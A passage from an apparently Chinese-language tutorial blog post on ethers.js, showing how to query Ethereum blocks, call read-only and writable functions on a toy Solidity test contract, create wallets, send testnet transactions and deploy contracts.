class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getBlockNumber</span>();<br>    <span class="hljs-keyword">const</span> testnetNum = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getBlockNumber</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mainnetNum);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(testnetNum);<br>   <br>    <span class="hljs-comment">// 对于区块信息的查询</span><br>        <span class="hljs-comment">/* 1. 查询区块信息： getBlock(区块高度) */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;\n6. 区块信息&#x27;</span>);<br>    <span class="hljs-keyword">const</span> mainnetBlock = <span class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getBlock</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">const</span> testnetBlock = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getBlock</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mainnetBlock);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(testnetBlock);<br>        <span class="hljs-comment">/* 2. 查询合约的 bytecode：getCode(&#x27;合约地址&#x27;) */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;\n7. 合约的 bytecode( 主网用的WETH地址, 测试网自己布置 )&quot;</span>);<br>    <span class="hljs-keyword">const</span> mainnetCode = <span class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getCode</span>(<span class="hljs-string">&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;</span>);<br>    <span class="hljs-keyword">const</span> testnetCode = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getCode</span>(<span class="hljs-string">&quot;0x4f28177481A9fB5b5a7E5DAFF067c99fdA4cA9f8&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;主网:&#x27;</span> + mainnetCode);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;测试网:&#x27;</span> + testnetCode);<br>&#125;<br><span class="hljs-title function_">main</span>();<br></code></pre></td></tr></table></figure><h1 id="2-以只读方式获取合约信息"><a href="#2-以只读方式获取合约信息" class="headerlink" title="2. 以只读方式获取合约信息"></a>2. 以只读方式获取合约信息</h1><p>通过 <code>Contract</code> 类可以与合约进行交互。<code>Contract</code> 对象分为 <strong><em>只读</em></strong> 和 <strong><em>可读写</em></strong> 两类，其创造方式不同。</p><ul><li><p>只读：<code>const example01 = new ethers.Contract(addr, abi, provider)</code></p><p>这样创造出的对象仅能与合约中的 <code>pure</code> 或 <code>view</code> 标记的函数交互。（<code>public</code> 变量会自动生成同名的 <code>view</code> 的函数，<code>private</code> 不会）</p></li><li><p>可读写：<code>const example02 = new ethers.Contract(addr, abi, signer)</code></p></li></ul><p>这里先看只读的，假设我们部署了如下合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Test &#123;<br>    string public name = &quot;victifa&quot;;<br>    uint8 private password;<br>    uint256 public number = 1;<br><br>    constructor(uint8 pw) &#123;<br>        password = pw;<br>    &#125;<br><br>    function anywayJustEnjoy() public pure returns(string memory) &#123;<br>        return (&quot;It&#x27;s time to ENJOY! &quot;);<br>    &#125;<br><br>    function JustSing(uint8 _password) public view returns(string memory) &#123;<br>        if (password == _password) &#123;<br>            return (unicode&quot;朋友的情义呀比天还高比地还辽阔💃🏻💃🏻💃🏻那些岁月我们一定会记得~~💃🏻💃🏻💃🏻朋友的情义呀我们今生最大的难得~💃🏻💃🏻💃🏻像一杯酒👍🏻👍🏻~~像一首老歌~👍🏻👍🏻👍🏻💃🏻💃🏻💃🏻💃🏻💃🏻💃🏻💃🏻💃🏻💃🏻💃🏻&quot;);<br>        &#125;<br>        else &#123;<br>            return (&quot;Darkest night, I&#x27;ll confront you here.&quot;);<br>        &#125;<br>    &#125;<br><br>    function YouCantUseIt() public &#123;<br>        number++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-创建只读-Contract-对象"><a href="#1-创建只读-Contract-对象" class="headerlink" title="1. 创建只读 Contract 对象"></a>1. 创建只读 <code>Contract</code> 对象</h2><p>有 3 个参数。<code>addr</code> 是合约地址， <code>provider</code> 是自己创的或者用公用的，<code>abi</code> 有如下两者获取方式：</p><ol><li><p>直接在 Remix 里编译好，去 <code>./artifacts/合约名_metadata.json</code> 里找复制下来。比如上方合约的 <code>abi</code> 即为（仅一部分）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> abiMethod01 = <span class="hljs-string">&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;uint8&quot;,&quot;name&quot;: &quot;pw&quot;,&quot;type&quot;: &quot;uint8&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;, 后面省略&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>由于该结果不友好，我们可以通过函数和事件的签名来手动给出 <code>abi</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> abiMethod02 = [<br>        <span class="hljs-string">&quot;function name() view returns (string)&quot;</span>,<br>        <span class="hljs-string">&quot;function number() view returns (uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function anywayJustEnjoy() pure returns(string)&quot;</span>,<br>        <span class="hljs-string">&quot;function JustSing(uint8) view returns(string)&quot;</span>,<br>        <span class="hljs-string">&quot;event noUseJustTest(string)&quot;</span>,<br>];<br></code></pre></td></tr></table></figure><p>对于我们不要的函数 / 事件，可以直接不写，如事件 <code>noUseJustTest</code> 不用，那不写进去也可以。</p></li></ol><h2 id="2-调用实例获取信息"><a href="#2-调用实例获取信息" class="headerlink" title="2. 调用实例获取信息"></a>2. 调用实例获取信息</h2><p>直接 <code>example01.函数名</code>。下面是对已部署合约信息的完整获取方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">privacy</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> addrTest = <span class="hljs-string">&#x27;0x2Af5932a3aBFee25720a726e31b36c10ca759d27&#x27;</span>;<br>    <span class="hljs-keyword">const</span> abiMethod01 = <span class="hljs-string">&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;uint8&quot;,&quot;name&quot;: &quot;pw&quot;,&quot;type&quot;: &quot;uint8&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;anonymous&quot;: false,&quot;inputs&quot;: [&#123;&quot;indexed&quot;: false,&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;noUseJustTest&quot;,&quot;type&quot;: &quot;event&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;uint8&quot;,&quot;name&quot;: &quot;_password&quot;,&quot;type&quot;: &quot;uint8&quot;&#125;],&quot;name&quot;: &quot;JustSing&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;YouCantUseIt&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;anywayJustEnjoy&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;pure&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;name&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;number&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;uint256&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;uint256&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;</span>;<span class="hljs-comment">// 确实讨厌</span><br>    <span class="hljs-keyword">const</span> abiMethod02 = [<br>        <span class="hljs-string">&quot;function name() view returns (string)&quot;</span>,<br>        <span class="hljs-string">&quot;function number() view returns (uint256)&quot;</span>,<br>        <span class="hljs-string">&quot;function anywayJustEnjoy() pure returns(string)&quot;</span>,<br>        <span class="hljs-string">&quot;function JustSing(uint8) view returns(string)&quot;</span>,<br>        <span class="hljs-string">&quot;event noUseJustTest(string)&quot;</span>,<br>    ];<br>    <span class="hljs-keyword">const</span> contractTest = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Contract</span>(addrTest, abiMethod02<span class="hljs-comment">/* 或abiMethod01 */</span>, providerSepolia);<br>    <span class="hljs-keyword">const</span> nameTest = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">name</span>();<br>    <span class="hljs-keyword">const</span> numberTest = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">number</span>();<br>    <span class="hljs-keyword">const</span> enjoyTest = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title function_">anywayJustEnjoy</span>();<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">JustSingTest</span> = <span class="hljs-keyword">await</span> contractTest.<span class="hljs-title class_">JustSing</span>(<span class="hljs-number">22</span>);<span class="hljs-comment">// 括号里的数是给调用合约的参数</span><br>    <span class="hljs-comment">// 会报错：const useTest = await contractTest.YouCantUseIt(); </span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`name:<span class="hljs-subst">$&#123;nameTest&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`number:<span class="hljs-subst">$&#123;numberTest&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`调用函数 anywayJustEnjoy 的结果:<span class="hljs-subst">$&#123;enjoyTest&#125;</span>`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`调用函数 JustSing 的结果:<span class="hljs-subst">$&#123;JustSingTest&#125;</span>`</span>);<br>&#125;<br><span class="hljs-title function_">privacy</span>();<br></code></pre></td></tr></table></figure><h1 id="3-钱包相关"><a href="#3-钱包相关" class="headerlink" title="3. 钱包相关"></a>3. 钱包相关</h1><p>主要涉及两个类：<code>Signer</code> 和 <code>Wallet</code> 类。其中 <code>Signer</code> 类是抽象的，<code>Wallet</code> 类是它的继承，可以实例化。</p><h2 id="1-Wallet-对象的创建"><a href="#1-Wallet-对象的创建" class="headerlink" title="1. Wallet 对象的创建"></a>1. <code>Wallet</code> 对象的创建</h2><ol><li><p>随机生成</p><p>先通过 <code>ethers.Wallet.createRandom()</code> 随机生成一个，再通过 <code>provider</code> 连上以太坊节点。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> wallet1 = ethers.<span class="hljs-property">Wallet</span>.<span class="hljs-title function_">createRandom</span>();<br><span class="hljs-keyword">const</span> wallet1WithProvider = wallet1.<span class="hljs-title function_">connect</span>(providerSepolia);<br></code></pre></td></tr></table></figure></li><li><p>通过私钥</p><p>去自己的钱包账户里查一下私钥，通过 <code>ethers.Wallet(私钥, provider)</code> new 一个出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> privateKey = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">const</span> wallet2 = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Wallet</span>(privateKey, providerSepolia);<br></code></pre></td></tr></table></figure></li><li><p>通过助记词</p><p>去自己钱包查，或者就用上面 <code>wallet1</code> 的，通过 <code>ethers.Wallet.fromPhrase(助记词)</code> 直接创建。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> secreteRecoveryPhrases = wallet1.<span class="hljs-property">mnemonic</span>.<span class="hljs-property">phrase</span>;<br><span class="hljs-keyword">const</span> wallet3 = ethers.<span class="hljs-property">Wallet</span>.<span class="hljs-title function_">fromPhrase</span>(secreteRecoveryPhrases);<br></code></pre></td></tr></table></figure></li></ol><h2 id="2-一些简单的小交互"><a href="#2-一些简单的小交互" class="headerlink" title="2. 一些简单的小交互"></a>2. 一些简单的小交互</h2><p>包括获取钱包地址，助记词（通过私钥创的无法获取），私钥等。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> addr1 = <span class="hljs-keyword">await</span> wallet1.<span class="hljs-title function_">getAddress</span>();<br><span class="hljs-keyword">const</span> addr2 = <span class="hljs-keyword">await</span> wallet2.<span class="hljs-title function_">getAddress</span>();<br><span class="hljs-keyword">const</span> addr3 = <span class="hljs-keyword">await</span> wallet3.<span class="hljs-title function_">getAddress</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet1: <span class="hljs-subst">$&#123;addr1&#125;</span>`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet2: <span class="hljs-subst">$&#123;addr2&#125;</span>`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet3: <span class="hljs-subst">$&#123;addr3&#125;</span>`</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet1的助记词: <span class="hljs-subst">$&#123;secreteRecoveryPhrases&#125;</span>`</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet2的私钥: <span class="hljs-subst">$&#123;wallet2.privateKey&#125;</span>`</span>);<br></code></pre></td></tr></table></figure><h2 id="3-发送交易"><a href="#3-发送交易" class="headerlink" title="3. 发送交易"></a>3. 发送交易</h2><ol><li><p>首先要有一个简单的发送请求，至少包含：接收地址 <code>to</code>，和发送金额 <code>value</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> tx = &#123;<br> <span class="hljs-attr">to</span>: addr1,<br> <span class="hljs-attr">value</span>: ethers.<span class="hljs-title function_">parseEther</span>(<span class="hljs-string">&#x27;0.000000001&#x27;</span>),<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>发送</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> receipt = <span class="hljs-keyword">await</span> wallet2.<span class="hljs-title function_">sendTransaction</span>(tx);<span class="hljs-comment">// 发送交易</span><br><span class="hljs-keyword">await</span> receipt.<span class="hljs-title function_">wait</span>();<span class="hljs-comment">// 等一等</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(receipt);<br></code></pre></td></tr></table></figure></li></ol><h2 id="4-完整交易过程"><a href="#4-完整交易过程" class="headerlink" title="4. 完整交易过程"></a>4. 完整交易过程</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">wallets</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> wallet1 = ethers.<span class="hljs-property">Wallet</span>.<span class="hljs-title function_">createRandom</span>();<br>    <span class="hljs-keyword">const</span> wallet1WithProvider = wallet1.<span class="hljs-title function_">connect</span>(providerSepolia);<br><br>    <span class="hljs-keyword">const</span> privateKey = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">const</span> wallet2 = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Wallet</span>(privateKey, providerSepolia);<br><br>    <span class="hljs-keyword">const</span> tx = &#123;<br>        <span class="hljs-attr">to</span>: addr1,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-comment">// 发个 1wei 意思意思就行了</span><br>    &#125;<br><br>    <span class="hljs-comment">// 发送前余额及交易次数</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet1: <span class="hljs-subst">$&#123;ethers.formatEther( <span class="hljs-keyword">await</span> providerSepolia.getBalance(wallet1WithProvider) )&#125;</span> ETH`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet2: <span class="hljs-subst">$&#123;ethers.formatEther( <span class="hljs-keyword">await</span> providerSepolia.getBalance(wallet2) )&#125;</span> ETH`</span>);<br><br>    <span class="hljs-comment">// 发出</span><br>    <span class="hljs-keyword">const</span> receipt = <span class="hljs-keyword">await</span> wallet2.<span class="hljs-title function_">sendTransaction</span>(tx);<br>    <span class="hljs-keyword">await</span> receipt.<span class="hljs-title function_">wait</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(receipt);<br><br>    <span class="hljs-comment">// 看看情况</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet1: <span class="hljs-subst">$&#123;ethers.formatEther( <span class="hljs-keyword">await</span> providerSepolia.getBalance(wallet1WithProvider) )&#125;</span> ETH`</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`wallet2: <span class="hljs-subst">$&#123;ethers.formatEther( <span class="hljs-keyword">await</span> providerSepolia.getBalance(wallet2) )&#125;</span> ETH`</span>);<br>&#125;<br><br><span class="hljs-title function_">wallets</span>();<br></code></pre></td></tr></table></figure><h1 id="4-合约交互"><a href="#4-合约交互" class="headerlink" title="4. 合约交互"></a>4. 合约交互</h1><h2 id="1-可读写-Contract-对象的创建"><a href="#1-可读写-Contract-对象的创建" class="headerlink" title="1. 可读写 Contract 对象的创建"></a>1. 可读写 <code>Contract</code> 对象的创建</h2><p>有两种办法创建。</p><ol><li><p>通过 new 一个 <code>ethers.Contract(addr, abi, signer)</code> 直接生成。其中 <code>addr</code> 是合约地址，<code>abi</code> 是合约abi接口，<code>signer</code> 是一个 <code>wallet</code> 对象（就是用了来和合约交互的钱包），以之前的 <code>Test</code> 合约为例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> addrTest = <span class="hljs-string">&#x27;0x2Af5932a3aBFee25720a726e31b36c10ca759d27&#x27;</span>;<br><span class="hljs-keyword">const</span> abiTest = [<br>    <span class="hljs-string">&quot;function number() view returns (uint256)&quot;</span>,<br>    <span class="hljs-string">&quot;function YouCantUseIt()&quot;</span>,<br>];<br><span class="hljs-keyword">const</span> privateKey = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">const</span> wallet = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Wallet</span>(privateKey, providerSepolia);<br><span class="hljs-keyword">const</span> contractTestNew = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Contract</span>(addrTest, abiTest, wallet);<br></code></pre></td></tr></table></figure></li><li><p>对已有的只读 <code>Contract</code> 对象，使用 <code>ObjName.connect(signer)</code> 搞出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> contractTestOld = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">Contract</span>(addrTest, abiTest, providerSepolia);<br><span class="hljs-keyword">const</span> contractTestNew = contractTestOld.<span class="hljs-title function_">connect</span>(wallet);<br></code></pre></td></tr></table></figure></li></ol><h2 id="2-合约交互"><a href="#2-合约交互" class="headerlink" title="2. 合约交互"></a>2. 合约交互</h2><p>格式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> contractObjName.<span class="hljs-title function_">METHOD_NAME</span>(args, [overrides])<br><span class="hljs-keyword">await</span> tx.<span class="hljs-title function_">wait</span>();<br></code></pre></td></tr></table></figure><ul><li><p><code>contractObjName</code>：创建的 <code>Contract</code> 对象名。</p></li><li><p><code>METHOD_NAME</code>：调用的函数名。</p></li><li><p><code>args</code>：传给函数的参数。</p></li><li><p><code>[overrides]</code>：（可选的）传入数据，包括：</p><ul><li><code>gasPrice</code>：gas价格</li><li><code>gasLimit</code>：gas上限</li><li><code>value</code>：调用时传入的ether（单位是wei）</li><li><code>nonce</code></li></ul><p>四种，以传参数<code>&quot;hi&quot;</code> 和 1 ether 为例，写为：<code>( &quot;hi&quot;, &#123;value: ethers.parseEther(&quot;1&quot;)&#125; )</code>。</p></li></ul><p>以调用 <code>Test</code> 合约的 <code>YouCantUseIt</code> 为例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> contractTestNew.number()&#125;</span>`</span>)<br><span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> contractTestNew.<span class="hljs-title class_">YouCantUseIt</span>();<br><span class="hljs-keyword">await</span> tx.<span class="hljs-title function_">wait</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> contractTestNew.number()&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>可以发现 <code>number</code> 加了1。</p><h3 id="返回值处理"><a href="#返回值处理" class="headerlink" title="返回值处理"></a>返回值处理</h3><p>由于这种方式无法接收返回值，需要时可以在函数里加个 <code>event</code>，然后在上面的 <code>tx</code> 里找。</p><h1 id="5-合约部署"><a href="#5-合约部署" class="headerlink" title="5. 合约部署"></a>5. 合约部署</h1><p>通过 <code>ContractFactory</code> 类实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> contractFactoryExample = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">ContractFactory</span>(abi, bytecode, signer);<br></code></pre></td></tr></table></figure><p>若有构造函数，则 <code>abi</code> 中要包含构造函数。<code>bytecode</code> 直接在 Remix 里复制。</p><p> 然后通过这两行实现部署。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> contractExample = <span class="hljs-keyword">await</span> contractFactoryExample.<span class="hljs-title function_">deploy</span>(构造函数的参数);<br><span class="hljs-keyword">await</span> contractExample.<span class="hljs-title function_">waitForDeployment</span>();<br></code></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>以下面这个 <code>Test</code> 合约为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Test &#123;<br>    uint8 password;<br>    uint256 public number = 1;<br><br>    constructor(uint8 pw) payable &#123;<br>        password = pw;<br>    &#125;<br><br>    event getReturn(uint256 indexed num);<br>    event txReceive(string);<br><br>    function YouCanUseIt() public returns(uint256) &#123;<br>        number++;<br>        emit getReturn(number);<br>        return number;<br>    &#125;<br><br>    function transfer(address payable to, uint256 amount) public payable &#123;<br>        (bool success, ) = to.call&#123;value: amount&#125;(&quot;&quot;);<br>        if (!success) &#123;<br>            revert(&quot;Failed.&quot;);<br>        &#125;<br>    &#125;<br><br>    function getBalance() view public returns(uint256)&#123;<br>        return address(this).balance;<br>    &#125;<br><br>    receive() external payable &#123;<br>        emit txReceive(&quot;Has received.&quot;);<br>    &#125;<br><br>    fallback() external payable &#123;<br>        emit txReceive(&quot;Has fallbacked.&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们进行以下操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">contractDeploy</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span 